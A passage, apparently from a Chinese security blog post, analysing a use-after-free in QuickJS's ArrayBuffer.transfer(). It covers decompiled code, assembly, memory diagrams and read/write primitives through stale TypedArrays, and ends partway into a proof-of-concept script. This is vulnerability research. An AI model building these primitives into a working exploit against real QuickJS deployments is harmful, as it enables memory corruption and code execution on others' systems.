<span class="hljs-section">+0x00: link.next (8 bytes)  ← 连接到ArrayBuffer的array_list</span>
<span class="hljs-section">+0x08: link.prev (8 bytes)</span>
<span class="hljs-section">+0x10: obj指针 (8 bytes)</span>
<span class="hljs-section">+0x18: buffer指针 (8 bytes)</span>
<span class="hljs-section">+0x20: offset (4 bytes)</span>
<span class="hljs-section">+0x24: length (4 bytes)</span>
</code></pre>
<p>当一个TypedArray被创建时，它会被添加到对应ArrayBuffer的<code>array_list</code>链表中。这个链表关系是整个漏洞的关键所在。</p>
<h3 data-id="heading-11">漏洞分析</h3>
<h4 data-id="heading-12">完整源码分析</h4>
<p>通过IDA逆向，我们得到了<code>js_array_buffer_transfer</code>函数的完整实现。让我们逐段分析：</p>
<pre><code class="hljs language-c" lang="c">JSValue __fastcall <span class="hljs-title function_">js_array_buffer_transfer</span><span class="hljs-params">(
        JSContext *ctx,
        JSValue this_val,
        <span class="hljs-type">int</span> argc,
        JSValue *argv,
        <span class="hljs-type">int</span> transfer_to_fixed_length)</span>
{
    <span class="hljs-type">int64_t</span> tag;
    JSArrayBuffer *v13;
    <span class="hljs-type">uint64_t</span> new_len;
    <span class="hljs-type">uint64_t</span> max_len[<span class="hljs-number">9</span>];
    
    tag = this_val.tag;
    
    <span class="hljs-comment">// 1. 获取ArrayBuffer对象指针</span>
    v13 = (JSArrayBuffer *)JS_GetOpaque2(ctx, this_val, <span class="hljs-number">0x13</span>u);
    <span class="hljs-keyword">if</span> (!v13)
        <span class="hljs-keyword">goto</span> ERROR_RETURN;
    
    <span class="hljs-comment">// 2. 检查是否为SharedArrayBuffer（不支持transfer）</span>
    <span class="hljs-keyword">if</span> (v13-&gt;shared)
        <span class="hljs-keyword">return</span> JS_ThrowTypeError(ctx, <span class="hljs-string">"cannot transfer a SharedArrayBuffer"</span>);
</code></pre>
<p>函数开始时进行基本的参数检查。注意<code>0x13u</code>是<code>JS_CLASS_ARRAY_BUFFER</code>的类ID。</p>
<pre><code class="hljs language-c" lang="c">    <span class="hljs-comment">// 3. 解析新的长度参数</span>
    <span class="hljs-keyword">if</span> (argc &gt; <span class="hljs-number">0</span> &amp;&amp; LODWORD(argv-&gt;tag) != <span class="hljs-number">3</span>) {
        <span class="hljs-keyword">if</span> (JS_ToIndex(ctx, &amp;new_len, *argv))
            <span class="hljs-keyword">goto</span> ERROR_RETURN;
    } <span class="hljs-keyword">else</span> {
        new_len = v13-&gt;byte_length;  <span class="hljs-comment">// 默认使用原长度</span>
    }
    
    <span class="hljs-comment">// 4. 检查原ArrayBuffer是否已经detached</span>
    <span class="hljs-keyword">if</span> (v13-&gt;detached)
        <span class="hljs-keyword">return</span> JS_ThrowTypeError(ctx, <span class="hljs-string">"ArrayBuffer is detached"</span>);
</code></pre>
<p>这里处理了<code>transfer()</code>的可选参数——新ArrayBuffer的大小。如果不指定，默认使用原大小。</p>
<pre><code class="hljs language-c" lang="c">    <span class="hljs-comment">// 5. 处理可调整大小的ArrayBuffer</span>
    <span class="hljs-keyword">if</span> (!transfer_to_fixed_length) {
        max_byte_length = v13-&gt;max_byte_length;
        <span class="hljs-keyword">if</span> ((max_byte_length &amp; <span class="hljs-number">0x80000000</span>) == <span class="hljs-number">0</span>) {
            max_len[<span class="hljs-number">0</span>] = v13-&gt;max_byte_length;
            <span class="hljs-keyword">if</span> (max_byte_length &lt; new_len)
                <span class="hljs-keyword">return</span> JS_ThrowTypeError(ctx, <span class="hljs-string">"invalid array buffer length"</span>);
            <span class="hljs-keyword">if</span> (v13-&gt;free_func == js_array_buffer_free)
                v16 = max_len;
        }
    }
</code></pre>
<p>这部分处理可调整大小（resizable）ArrayBuffer的情况，检查新长度是否超过<code>maxByteLength</code>。</p>
<h4 data-id="heading-13">关键漏洞代码</h4>
<p>接下来是核心的数据转移逻辑，也是<strong>漏洞所在</strong>：</p>
<pre><code class="hljs language-c" lang="c">    <span class="hljs-comment">// 6. 如果新长度不为0，需要复制或重分配数据</span>
    <span class="hljs-keyword">if</span> (new_len) {
        data = v13-&gt;data;
        free_func = v13-&gt;free_func;
        byte_length = v13-&gt;byte_length;
        
        <span class="hljs-comment">// 情况1: 长度不变，直接使用原数据</span>
        <span class="hljs-keyword">if</span> (byte_length == new_len) {
            v23 = v13-&gt;data;
            <span class="hljs-keyword">goto</span> DETACH_AND_RETURN;
        }
        
        <span class="hljs-comment">// 情况2: 长度改变，需要realloc或memcpy</span>
        <span class="hljs-keyword">if</span> (new_len &lt;= <span class="hljs-number">0x7FFFFFFF</span>) {
            <span class="hljs-comment">// 如果使用默认的free函数，尝试realloc</span>
            <span class="hljs-keyword">if</span> (free_func == js_array_buffer_free) {
                v26 = (<span class="hljs-type">uint8_t</span> *)js_realloc(ctx, v13-&gt;data, new_len);
                v23 = v26;
                <span class="hljs-keyword">if</span> (v26) {
                    <span class="hljs-comment">// 如果扩大了，需要将新增部分清零</span>
                    <span class="hljs-keyword">if</span> (v13-&gt;byte_length &lt; new_len) {
                        <span class="hljs-built_in">memset</span>(&amp;v26[v13-&gt;byte_length], <span class="hljs-number">0</span>, 
                               new_len - v13-&gt;byte_length);
                    }
                    <span class="hljs-keyword">goto</span> DETACH_AND_RETURN;
                }
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// 如果使用自定义free函数，需要重新分配并复制</span>
                v21 = (<span class="hljs-type">uint8_t</span> *)js_mallocz_rt(ctx-&gt;rt, new_len);
                <span class="hljs-keyword">if</span> (v21) {
                    <span class="hljs-type">int</span> copy_size = (byte_length &lt;= new_len) ? 
                                    byte_length : new_len;
                    <span class="hljs-built_in">memcpy</span>(v21, data, copy_size);
                    v13-&gt;free_func(ctx-&gt;rt, v13-&gt;opaque, data);
                    v23 = v21;
                    free_func = js_array_buffer_free;
                    <span class="hljs-keyword">goto</span> DETACH_AND_RETURN;
                }
            }
            <span class="hljs-keyword">goto</span> ERROR_RETURN;
        }
        <span class="hljs-keyword">return</span> JS_ThrowRangeError(ctx, <span class="hljs-string">"invalid array buffer length"</span>);
        
DETACH_AND_RETURN:
        <span class="hljs-comment">// ⚠️⚠️⚠️ 漏洞核心：只标记ArrayBuffer为detached ⚠️⚠️⚠️</span>
        v13-&gt;detached = <span class="hljs-number">1</span>;       <span class="hljs-comment">// 设置detached标志</span>
        v13-&gt;data = <span class="hljs-number">0</span>;           <span class="hljs-comment">// 清空data指针</span>
        v13-&gt;byte_length = <span class="hljs-number">0</span>;    <span class="hljs-comment">// 清空byte_length</span>
        
        <span class="hljs-comment">// ❌ 关键问题：没有遍历array_list更新TypedArray视图！</span>
        <span class="hljs-comment">// ❌ 没有调用任何函数来同步视图状态！</span>
        
        <span class="hljs-comment">// 创建并返回新的ArrayBuffer</span>
        <span class="hljs-keyword">return</span> js_array_buffer_constructor3(
            ctx, (JSValue)__PAIR128__(<span class="hljs-number">3</span>, <span class="hljs-number">0</span>), 
            new_len, v16, <span class="hljs-number">0x13</span>u, v23, free_func, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
    }
</code></pre>
<p><strong>这就是漏洞的本质</strong>：在<code>DETACH_AND_RETURN</code>标签处，代码只做了三件事：</p>
<ol>
<li>设置<code>v13-&gt;detached = 1</code></li>
<li>清空<code>v13-&gt;data = 0</code></li>
<li>清空<code>v13-&gt;byte_length = 0</code></li>
</ol>
<p>但是，<strong>完全没有处理<code>v13-&gt;array_list</code>中链接的所有TypedArray视图</strong>！这导致：</p>
<ul>
<li>ArrayBuffer对象自己知道已经detached了</li>
<li>但是所有基于它创建的TypedArray视图还保留着旧的<code>length</code>和<code>data</code>指针</li>
<li>这些TypedArray的内部状态指向的是已经被转移的内存区域</li>
</ul>
<pre><code class="hljs language-c" lang="c">    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 7. 如果新长度为0，调用JS_DetachArrayBuffer正确处理</span>
        JS_DetachArrayBuffer(ctx, 
            (JSValue)__PAIR128__(tag, (<span class="hljs-type">unsigned</span> __int64)this_val.u.ptr));
        <span class="hljs-keyword">return</span> js_array_buffer_constructor3(
            ctx, (JSValue)__PAIR128__(<span class="hljs-number">3</span>, <span class="hljs-number">0</span>), 
            <span class="hljs-number">0</span>, v16, <span class="hljs-number">0x13</span>u, <span class="hljs-number">0</span>, js_array_buffer_free, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);
    }
</code></pre>
<p>有意思的是，当<code>new_len == 0</code>时，代码<strong>正确地调用了<code>JS_DetachArrayBuffer</code></strong>！这说明开发者知道存在这个函数，却在主要路径上没有使用它。</p>
<h4 data-id="heading-14">正确实现：JS_DetachArrayBuffer分析</h4>
<p>让我们看看正确的detach实现是什么样的：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-type">void</span> <span class="hljs-title function_">JS_DetachArrayBuffer</span><span class="hljs-params">(JSContext *ctx, JSValue obj)</span>
{
    JSArrayBuffer *abuf = JS_GetOpaque(obj, JS_CLASS_ARRAY_BUFFER);
    
    <span class="hljs-keyword">if</span> (!abuf || abuf-&gt;detached)
        <span class="hljs-keyword">return</span>;
    
    <span class="hljs-comment">// ✅ 关键步骤：遍历array_list中的所有TypedArray视图</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> *<span class="hljs-title">el</span>, *<span class="hljs-title">el1</span>;</span>
    list_for_each_safe(el, el1, &amp;abuf-&gt;array_list) {
        JSTypedArray *ta = list_entry(el, JSTypedArray, link);
        JSObject *view = ta-&gt;obj;
        
        <span class="hljs-comment">// ✅ 更新每个视图的状态</span>
        <span class="hljs-keyword">if</span> (view-&gt;class_id != JS_CLASS_DATAVIEW) {
            <span class="hljs-comment">// 对于TypedArray，清空length和data指针</span>
            view-&gt;u.typed_array.length = <span class="hljs-number">0</span>;
            view-&gt;u.typed_array.data = <span class="hljs-literal">NULL</span>;
        }
        <span class="hljs-comment">// DataView的处理略有不同，但也会失效</span>
    }
    
    <span class="hljs-comment">// ✅ 所有视图都更新完毕后，才标记ArrayBuffer为detached</span>
    abuf-&gt;detached = <span class="hljs-number">1</span>;
    abuf-&gt;data = <span class="hljs-literal">NULL</span>;
    abuf-&gt;byte_length = <span class="hljs-number">0</span>;
}
</code></pre>
<p>对比两者的区别：</p>








































<table><thead><tr><th>操作</th><th>js_array_buffer_transfer</th><th>JS_DetachArrayBuffer</th></tr></thead><tbody><tr><td>设置detached标志</td><td>✅</td><td>✅</td></tr><tr><td>清空data指针</td><td>✅</td><td>✅</td></tr><tr><td>清空byte_length</td><td>✅</td><td>✅</td></tr><tr><td>遍历array_list</td><td>❌ <strong>缺失</strong></td><td>✅</td></tr><tr><td>更新TypedArray.length</td><td>❌ <strong>缺失</strong></td><td>✅</td></tr><tr><td>更新TypedArray.data</td><td>❌ <strong>缺失</strong></td><td>✅</td></tr></tbody></table>
<h4 data-id="heading-15">漏洞触发流程对比</h4>
<p><strong>正常的ArrayBuffer.resize()流程（参考对比）：</strong></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">用户调用: buffer.resize(newSize)</span>
    ↓
<span class="hljs-section">进入: js_array_buffer_resize (地址 0x4b370)</span>
    ↓
分配/调整内存
    ↓
遍历 array_list 链表 (行 52-81)
    ↓
更新每个 TypedArray 的:
    - length 字段
    - data 指针
    - 其他相关状态
    ↓
✅ 所有视图状态与ArrayBuffer保持同步
</code></pre>
<p><strong>存在漏洞的ArrayBuffer.transfer()流程：</strong></p>
<pre><code class="hljs language-ini" lang="ini">用户调用: buffer.transfer(newSize)
    ↓
进入: js_array_buffer_transfer (地址 0xa6450)
    ↓
复制/转移数据到新内存
    ↓
标记原ArrayBuffer:
    - <span class="hljs-attr">detached</span> = <span class="hljs-number">1</span>
    - <span class="hljs-attr">data</span> = NULL
    - <span class="hljs-attr">byte_length</span> = <span class="hljs-number">0</span>
    ↓
❌ 跳过遍历 array_list 的步骤
    ↓
创建新ArrayBuffer并返回
    ↓
❌ 旧的TypedArray视图仍然保留:
    - 非零的 length
    - 指向已转移内存的 data 指针
    ↓
💣 Use-After-Free 漏洞！
</code></pre>
<h4 data-id="heading-16">汇编层面的验证</h4>
<p>在IDA中查看关键代码段（地址 0xa659b - 0xa65d5）：</p>
<pre><code class="hljs language-asm" lang="asm">; 设置detached状态
loc_A659B:
    mov     byte ptr [r8+8], 1      ; v13-&gt;detached = 1
    mov     qword ptr [r8+10h], 0   ; v13-&gt;data = NULL
    mov     dword ptr [r8], 0       ; v13-&gt;byte_length = 0
    
    ; 准备调用js_array_buffer_constructor3创建新buffer
    mov     rdi, r12                ; ctx
    mov     esi, 3                  ; tag
    xor     edx, edx                ; ptr = NULL
    mov     rcx, r13                ; new_len
    mov     r8, r14                 ; max_len
    mov     r9d, 13h                ; class_id
    mov     [rsp+90h+var_70], rbx   ; data
    mov     [rsp+90h+var_68], rbp   ; free_func
    mov     [rsp+90h+var_60], 0     ; opaque
    mov     [rsp+90h+var_58], 0     ; shared
    
    call    js_array_buffer_constructor3
    ; ↑ 注意：从设置detached到这里，没有任何对array_list的操作！
    
    jmp     loc_A66AD               ; 返回
</code></pre>
<p>可以清楚地看到，在标记detached和创建新buffer之间，<strong>没有任何循环或函数调用来处理<code>array_list</code></strong>。这段汇编代码直接印证了我们从伪代码中看到的问题。</p>
<h4 data-id="heading-17">内存状态图解</h4>
<p>让我们用图示来理解漏洞前后的内存状态变化：</p>
<p><strong>调用transfer()之前：</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">堆内存:</span>
<span class="hljs-string">┌──────────────────┐</span> <span class="hljs-number">0x555556789000</span>
<span class="hljs-string">│</span>  <span class="hljs-string">实际数据区域</span>     <span class="hljs-string">│</span>
<span class="hljs-string">│</span> [<span class="hljs-number">0xAAAA0000</span>]     <span class="hljs-string">│</span>
<span class="hljs-string">│</span> [<span class="hljs-number">0xAAAA0001</span>]     <span class="hljs-string">│</span>
<span class="hljs-string">│</span> [<span class="hljs-number">0xAAAA0002</span>]     <span class="hljs-string">│</span>
<span class="hljs-string">│</span>      <span class="hljs-string">...</span>         <span class="hljs-string">│</span>
<span class="hljs-string">└──────────────────┘</span>

<span class="hljs-string">ArrayBuffer对象</span> <span class="hljs-string">(ab1):</span>
<span class="hljs-string">┌──────────────────┐</span>
<span class="hljs-string">│</span> <span class="hljs-attr">byte_length:</span>     <span class="hljs-string">│</span> <span class="hljs-string">=</span> <span class="hljs-number">0x100</span>
<span class="hljs-string">│</span> <span class="hljs-attr">detached:</span>        <span class="hljs-string">│</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span> <span class="hljs-string">(false)</span>
<span class="hljs-string">│</span> <span class="hljs-attr">data:</span> <span class="hljs-string">───────────┼─→</span> <span class="hljs-number">0x555556789000</span>
<span class="hljs-string">│</span> <span class="hljs-attr">array_list:</span> <span class="hljs-string">─────┼─→</span> [<span class="hljs-string">TypedArray链表</span>]
<span class="hljs-string">│</span>   <span class="hljs-attr">next:</span> <span class="hljs-string">─────────┼──┐</span>
<span class="hljs-string">│</span>   <span class="hljs-attr">prev:</span> <span class="hljs-string">─────────┼──┤</span>
<span class="hljs-string">│</span> <span class="hljs-attr">free_func:</span>       <span class="hljs-string">│</span>  <span class="hljs-string">│</span>
<span class="hljs-string">└──────────────────┘</span>  <span class="hljs-string">│</span>
                      <span class="hljs-string">│</span>
<span class="hljs-string">TypedArray对象</span> <span class="hljs-string">(ta1):</span> <span class="hljs-string">│</span>
<span class="hljs-string">┌──────────────────┐</span>  <span class="hljs-string">│</span>
<span class="hljs-string">│</span> <span class="hljs-attr">link:</span> <span class="hljs-string">───────────┼──┘</span> <span class="hljs-string">(连接到ab1的array_list)</span>
<span class="hljs-string">│</span> <span class="hljs-attr">obj:</span>             <span class="hljs-string">│</span>
<span class="hljs-string">│</span> <span class="hljs-attr">buffer:</span> <span class="hljs-string">─────────┼─→</span> <span class="hljs-string">ab1</span>
<span class="hljs-string">│</span> <span class="hljs-attr">offset:</span>          <span class="hljs-string">│</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span>
<span class="hljs-string">│</span> <span class="hljs-attr">length:</span>          <span class="hljs-string">│</span> <span class="hljs-string">=</span> <span class="hljs-number">64</span> <span class="hljs-string">(0x100/4)</span>
<span class="hljs-string">└──────────────────┘</span>
  <span class="hljs-string">↓</span>
<span class="hljs-string">JSObject</span> <span class="hljs-string">(实际的Uint32Array):</span>
<span class="hljs-string">┌──────────────────┐</span>
<span class="hljs-string">│</span> <span class="hljs-attr">class_id:</span> <span class="hljs-string">───────┼─→</span> <span class="hljs-string">JS_CLASS_UINT32_ARRAY</span>
<span class="hljs-string">│</span> <span class="hljs-attr">u.typed_array:</span>   <span class="hljs-string">│</span>
<span class="hljs-string">│</span>   <span class="hljs-attr">length:</span> <span class="hljs-string">───────┼─→</span> <span class="hljs-number">64</span>
<span class="hljs-string">│</span>   <span class="hljs-attr">data:</span> <span class="hljs-string">─────────┼─→</span> <span class="hljs-number">0x555556789000</span>
<span class="hljs-string">└──────────────────┘</span>
</code></pre>
<p><strong>调用ab1.transfer()之后：</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">堆内存:</span>
<span class="hljs-string">┌──────────────────┐</span> <span class="hljs-number">0x555556ABC000</span> <span class="hljs-string">(新分配)</span>
<span class="hljs-string">│</span>  <span class="hljs-string">转移后的数据</span>     <span class="hljs-string">│</span>
<span class="hljs-string">│</span> [<span class="hljs-number">0xAAAA0000</span>]     <span class="hljs-string">│</span>
<span class="hljs-string">│</span> [<span class="hljs-number">0xAAAA0001</span>]     <span class="hljs-string">│</span>
<span class="hljs-string">│</span> [<span class="hljs-number">0xAAAA0002</span>]     <span class="hljs-string">│</span>
<span class="hljs-string">│</span>      <span class="hljs-string">...</span>         <span class="hljs-string">│</span>
<span class="hljs-string">└──────────────────┘</span>

<span class="hljs-string">┌──────────────────┐</span> <span class="hljs-number">0x555556789000</span> <span class="hljs-string">(旧地址)</span>
<span class="hljs-string">│</span>  <span class="hljs-string">可能被重用的</span>     <span class="hljs-string">│</span> <span class="hljs-string">←</span> <span class="hljs-string">⚠️</span> <span class="hljs-string">悬空指针指向这里！</span>
<span class="hljs-string">│</span>  <span class="hljs-string">内存区域</span>         <span class="hljs-string">│</span>    <span class="hljs-string">可能包含:</span>
<span class="hljs-string">│</span> [<span class="hljs-string">tcache</span> <span class="hljs-string">fd</span>]      <span class="hljs-string">│</span>    <span class="hljs-bullet">-</span> <span class="hljs-string">tcache链表指针</span>
<span class="hljs-string">│</span> [<span class="hljs-string">heap</span> <span class="hljs-string">metadata</span>]  <span class="hljs-string">│</span>    <span class="hljs-bullet">-</span> <span class="hljs-string">其他对象数据</span>
<span class="hljs-string">│</span>      <span class="hljs-string">...</span>         <span class="hljs-string">│</span>    <span class="hljs-bullet">-</span> <span class="hljs-string">libc指针</span>
<span class="hljs-string">└──────────────────┘</span>

<span class="hljs-string">原ArrayBuffer对象</span> <span class="hljs-string">(ab1):</span>
<span class="hljs-string">┌──────────────────┐</span>
<span class="hljs-string">│</span> <span class="hljs-attr">byte_length:</span>     <span class="hljs-string">│</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span> <span class="hljs-string">✅</span>
<span class="hljs-string">│</span> <span class="hljs-attr">detached:</span>        <span class="hljs-string">│</span> <span class="hljs-string">=</span> <span class="hljs-number">1</span> <span class="hljs-string">✅</span>
<span class="hljs-string">│</span> <span class="hljs-attr">data:</span>            <span class="hljs-string">│</span> <span class="hljs-string">=</span> <span class="hljs-literal">NULL</span> <span class="hljs-string">✅</span>
<span class="hljs-string">│</span> <span class="hljs-attr">array_list:</span> <span class="hljs-string">─────┼─→</span> [<span class="hljs-string">链表仍然存在</span>]
<span class="hljs-string">│</span>   <span class="hljs-attr">next:</span> <span class="hljs-string">─────────┼──┐</span>
<span class="hljs-string">│</span>   <span class="hljs-attr">prev:</span> <span class="hljs-string">─────────┼──┤</span>
<span class="hljs-string">└──────────────────┘</span>  <span class="hljs-string">│</span>
                      <span class="hljs-string">│</span>
<span class="hljs-string">原TypedArray对象</span> <span class="hljs-string">(ta1):</span> <span class="hljs-string">│</span>
<span class="hljs-string">┌──────────────────┐</span>  <span class="hljs-string">│</span>
<span class="hljs-string">│</span> <span class="hljs-attr">link:</span> <span class="hljs-string">───────────┼──┘</span> <span class="hljs-string">(仍然连接)</span>
<span class="hljs-string">│</span> <span class="hljs-attr">obj:</span>             <span class="hljs-string">│</span>
<span class="hljs-string">│</span> <span class="hljs-attr">buffer:</span> <span class="hljs-string">─────────┼─→</span> <span class="hljs-string">ab1</span> <span class="hljs-string">(已detached)</span>
<span class="hljs-string">│</span> <span class="hljs-attr">offset:</span>          <span class="hljs-string">│</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span> <span class="hljs-string">❌</span> <span class="hljs-string">未清零</span>
<span class="hljs-string">│</span> <span class="hljs-attr">length:</span>          <span class="hljs-string">│</span> <span class="hljs-string">=</span> <span class="hljs-number">64</span> <span class="hljs-string">❌</span> <span class="hljs-string">未清零！</span>
<span class="hljs-string">└──────────────────┘</span>
  <span class="hljs-string">↓</span>
<span class="hljs-string">JSObject</span> <span class="hljs-string">(ta1对应的Uint32Array):</span>
<span class="hljs-string">┌──────────────────┐</span>
<span class="hljs-string">│</span> <span class="hljs-attr">class_id:</span> <span class="hljs-string">───────┼─→</span> <span class="hljs-string">JS_CLASS_UINT32_ARRAY</span>
<span class="hljs-string">│</span> <span class="hljs-attr">u.typed_array:</span>   <span class="hljs-string">│</span>
<span class="hljs-string">│</span>   <span class="hljs-attr">length:</span> <span class="hljs-string">───────┼─→</span> <span class="hljs-number">64</span> <span class="hljs-string">❌</span> <span class="hljs-string">应该是0！</span>
<span class="hljs-string">│</span>   <span class="hljs-attr">data:</span> <span class="hljs-string">─────────┼─→</span> <span class="hljs-number">0x555556789000</span> <span class="hljs-string">❌</span> <span class="hljs-string">应该是NULL！</span>
<span class="hljs-string">└──────────────────┘</span>         <span class="hljs-string">│</span>
                             <span class="hljs-string">│</span>
                             <span class="hljs-string">└→</span> <span class="hljs-string">💣</span> <span class="hljs-string">悬空指针！指向已释放/转移的内存</span>

<span class="hljs-string">新ArrayBuffer对象</span> <span class="hljs-string">(ab2):</span>
<span class="hljs-string">┌──────────────────┐</span>
<span class="hljs-string">│</span> <span class="hljs-attr">byte_length:</span>     <span class="hljs-string">│</span> <span class="hljs-string">=</span> <span class="hljs-number">0x100</span>
<span class="hljs-string">│</span> <span class="hljs-attr">detached:</span>        <span class="hljs-string">│</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span>
<span class="hljs-string">│</span> <span class="hljs-attr">data:</span> <span class="hljs-string">───────────┼─→</span> <span class="hljs-number">0x555556ABC000</span> <span class="hljs-string">(新地址)</span>
<span class="hljs-string">│</span> <span class="hljs-attr">array_list:</span> <span class="hljs-string">─────┼─→</span> [<span class="hljs-string">空链表或新视图</span>]
<span class="hljs-string">└──────────────────┘</span>

<span class="hljs-string">新TypedArray对象</span> <span class="hljs-string">(ta2):</span>
<span class="hljs-string">┌──────────────────┐</span>
<span class="hljs-string">│</span> <span class="hljs-attr">buffer:</span> <span class="hljs-string">─────────┼─→</span> <span class="hljs-string">ab2</span>
<span class="hljs-string">│</span> <span class="hljs-attr">offset:</span>          <span class="hljs-string">│</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span>
<span class="hljs-string">│</span> <span class="hljs-attr">length:</span>          <span class="hljs-string">│</span> <span class="hljs-string">=</span> <span class="hljs-number">64</span>
<span class="hljs-string">└──────────────────┘</span>
  <span class="hljs-string">↓</span>
<span class="hljs-attr">JSObject:</span>
<span class="hljs-string">┌──────────────────┐</span>
<span class="hljs-string">│</span> <span class="hljs-attr">u.typed_array:</span>   <span class="hljs-string">│</span>
<span class="hljs-string">│</span>   <span class="hljs-attr">length:</span> <span class="hljs-string">───────┼─→</span> <span class="hljs-number">64</span>
<span class="hljs-string">│</span>   <span class="hljs-attr">data:</span> <span class="hljs-string">─────────┼─→</span> <span class="hljs-number">0x555556ABC000</span> <span class="hljs-string">✅</span> <span class="hljs-string">正确</span>
<span class="hljs-string">└──────────────────┘</span>
</code></pre>
<p>关键观察：</p>
<ol>
<li><strong>ab1被正确标记为detached</strong>（detached=1, data=NULL, byte_length=0）</li>
<li><strong>ta1的TypedArray结构体没有更新</strong>（length仍为64）</li>
<li><strong>ta1对应的JSObject.u.typed_array也没有更新</strong>（data指针仍指向0x555556789000）</li>
<li><strong>结果</strong>：通过ta1访问数组时，QuickJS不会检查底层ArrayBuffer是否detached，直接使用JSObject中保存的data指针和length，导致访问已释放/转移的内存</li>
</ol>
<h4 data-id="heading-18">UAF的具体表现</h4>
<p>这个UAF有以下特点：</p>
<ol>
<li><strong>读原语</strong>：可以通过旧TypedArray读取已转移内存区域的数据</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> value = ta1[<span class="hljs-number">0</span>]; <span class="hljs-comment">// 读取0x555556789000位置的数据</span>
</code></pre>
<ol>
<li><strong>写原语</strong>：可以通过旧TypedArray写入已转移内存区域</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript">ta1[<span class="hljs-number">0</span>] = <span class="hljs-number">0xDEADBEEF</span>; <span class="hljs-comment">// 写入0x555556789000位置</span>
</code></pre>
<ol>
<li><strong>数据重叠</strong>：如果旧内存区域被新分配的ArrayBuffer复用，会造成数据损坏</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript">ta1[<span class="hljs-number">0</span>] = <span class="hljs-number">0x12345678</span>; <span class="hljs-comment">// 写入旧地址</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ta2[<span class="hljs-number">0</span>]); <span class="hljs-comment">// 如果内存重叠，可能读到0x12345678</span>
</code></pre>
<h3 data-id="heading-19">漏洞验证实验</h3>
<p>理论分析完毕，让我们通过实际代码来验证漏洞的存在。</p>
<h4 data-id="heading-20">实验1：基础UAF验证</h4>
<p>首先编写最简单的PoC来确认漏洞触发：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// simple_uaf_verify.js - 验证UAF漏洞存在</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"="</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">70</span>));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[*] QuickJS ArrayBuffer.transfer() UAF Vulnerability Verification"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"="</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">70</span>));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 阶段1：创建测试对象</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Phase 1] Creating ArrayBuffer and TypedArray..."</span>);
<span class="hljs-keyword">const</span> ab1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x100</span>);
<span class="hljs-keyword">const</span> ta1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint32Array</span>(ab1);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] ArrayBuffer created: size = 0x100 bytes"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] TypedArray created: length ="</span>, ta1.<span class="hljs-property">length</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] TypedArray byteLength ="</span>, ta1.<span class="hljs-property">byteLength</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 阶段2：填充可识别的测试数据</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Phase 2] Filling with test pattern..."</span>);
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; ta1.<span class="hljs-property">length</span>; i++) {
    ta1[i] = <span class="hljs-number">0xAAAA0000</span> + i;
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Pattern: 0xAAAA0000, 0xAAAA0001, 0xAAAA0002, ..."</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] ta1[0] ="</span>, <span class="hljs-string">"0x"</span> + ta1[<span class="hljs-number">0</span>].<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">8</span>, <span class="hljs-string">"0"</span>));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] ta1[1] ="</span>, <span class="hljs-string">"0x"</span> + ta1[<span class="hljs-number">1</span>].<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">8</span>, <span class="hljs-string">"0"</span>));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] ta1[2] ="</span>, <span class="hljs-string">"0x"</span> + ta1[<span class="hljs-number">2</span>].<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">8</span>, <span class="hljs-string">"0"</span>));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 阶段3：触发漏洞</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Phase 3] Triggering vulnerability via transfer()..."</span>);
